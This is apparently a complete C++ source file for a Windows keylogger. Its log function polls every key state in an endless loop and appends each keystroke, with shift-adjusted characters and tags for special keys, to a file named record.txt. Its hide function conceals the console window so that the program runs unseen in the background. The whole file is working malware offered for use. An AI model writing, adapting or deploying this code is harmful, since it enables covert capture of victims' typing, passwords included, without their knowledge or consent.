#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;
void hide();
void log();
int main()
{
    hide();
	log();

    return 0;
}

//============================================//
//============================================//
//===========================================//
//============== start keylogger=============//

void log()
{
	char pk;
	//pressed key
	for(;;)
	{

		for(pk=8;pk<=222;pk++)
		{
            if(GetAsyncKeyState(pk) == -32767)
            {
                ofstream write("record.txt",ios::app);

			if( ((pk>64)&&(pk<91))  && (!( GetAsyncKeyState(0x10) ) ))
			{
				pk+=32;
				write<<pk;
				write.close();

			}
			else if ((pk>64)&&(pk<91))
			{
				write<<pk;
				write.close();

			}
			else
				{
					switch(pk)
					{
						case 49:
						{
						if(GetAsyncKeyState(0x10))
						write<<"!";
						else
						write<<"1";
						}
						break;

						case 50:
						{
						if(GetAsyncKeyState(0x10))
						write<<"@";
						else
						write<<"2";
						}
						break;

						case 51:
						{
						if(GetAsyncKeyState(0x10))
						write<<"#";
						else
						write<<"3";
						}
						break;

						case 52:
						{
						if(GetAsyncKeyState(0x10))
						write<<"$";
						else
						write<<"4";
						}
						break;

						case 53:
						{
						if(GetAsyncKeyState(0x10))
						write<<"%";
						else
						write<<"5";
						}
						break;

						case 54:
						{
						if(GetAsyncKeyState(0x10))
						write<<"^";
						else
						write<<"6";
						}
						break;

						case 55:
						{
						if(GetAsyncKeyState(0x10))
						write<<"&";
						else
						write<<"7";
						}
						break;

						case 56:
						{
						if(GetAsyncKeyState(0x10))
						write<<"*";
						else
						write<<"8";
						}
						break;

						case 57:
						{
						if(GetAsyncKeyState(0x10))
						write<<"(";
						else
						write<<"9";
						}
						break;

						case 48:
						{
						if(GetAsyncKeyState(0x10))
						write<<")";
						else
						write<<"0";
						}
						break;

						case 43:
						write<<"+";
						break;

						case 44:
						write <<"'";
						break;

						case 45:
						write<<"-";
						break;

						case 46:
						write <<".";
						break;

						case 47:
						{
						if (GetAsyncKeyState(0x10))
						write<<"?";
						else
						write <<"/";
						}
						break;

						case 58:
						write <<":";
						break;

						case 59:
						write<<";";
						break;

						case 60:
						write<<"<";
						break;

						case 61:
						{
						if (GetAsyncKeyState(0x10))
						write<<"+";
						else
						write<<"=";
						}
						break;

						case 62:
						write<<">";
						break;

						case VK_BACK :
						write<<"<back spase>";
						break;

						case VK_TAB:
						write<<"<tab>";
						break;

						case VK_RETURN:
						write<<"<enter>";
						break;

						case VK_CONTROL:
						write<<"<ctrl>";
						break;

						case VK_MENU:
						write<<"<alt>";
						break;

						case VK_CAPITAL :
						write<<"<caps lock>";
						break;

						case VK_LBUTTON :
						write<<"<left mouse>";
						break;

						case VK_RBUTTON :
						write<<"<right mouse>";
						break;

						case VK_MBUTTON :
						write<<"<middle mouse>";
						break;

						case VK_ESCAPE :
						write<<"<esc>";
						break;

						case VK_SPACE :
						write<<' ';
						break;

						case VK_PRIOR :
						write<<"<page up>";
						break;

						case VK_NEXT :
						write<<"<page down>";
						break;

						case VK_END :
						write<<"<end key>";
						break;

						case VK_HOME :
						write<<"<home key";
						break;

						case VK_LEFT :
						write<<"<left arrow>";
						break;

						case VK_UP :
						write<<"<up arrow>";
						break;

						case VK_RIGHT :
						write<<"<right arrow>";
						break;

						case VK_DOWN :
						write<<"<down arrow>";
						break;

						case 127:
						write<<"<del>";
						break;

						case VK_F1 :
						write<<"<f1>";
						break;

						case VK_F2 :
						write<<"<f2>";
						break;

						case VK_F3 :
						write<<"<f3>";
						break;

						case VK_F4 :
						write<<"<f4>";
						break;

						case VK_F5 :
						write<<"<f5>";
						break;

						case VK_F6 :
						write<<"<f6>";
						break;

						case VK_F7 :
						write<<"<f7>";
						break;

						case VK_F8 :
						write<<"<f8>";
						break;

						case VK_F9 :
						write<<"<f9>";
						break;

						case VK_F10 :
						write<<"<f10>";
						break;

						case VK_F11 :
						write<<"<f11>";
						break;

						case VK_F12 :
						write<<"<f12>";
						break;

						case VK_F13 :
						write<<"<f13>";
						break;

						case VK_F14 :
						write<<"<f14>";
						break;

						case VK_F15 :
						write<<"<f15>";
						break;

						case VK_F17 :
						write<<"<f17>";
						break;

						case VK_F18 :
						write<<"<f18>";
						break;

						case VK_F19 :
						write<<"<f19>";
						break;

						case VK_F20 :
						write<<"<f20>";
						break;

						case VK_F21 :
						write<<"<f21>";
						break;

						case VK_F22 :
						write<<"<f22>";
						break;

						case VK_F23 :
						write<<"<f23>";
						break;

						case VK_F24 :
						write<<"<f24>";
						break;

					}
				}
			}

		}
	}
}



/*===================
====== HIDING PART===
=====================*/
//this part runs your code in background!!

void hide()
{
    HWND Stealth ;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(Stealth,0);

}

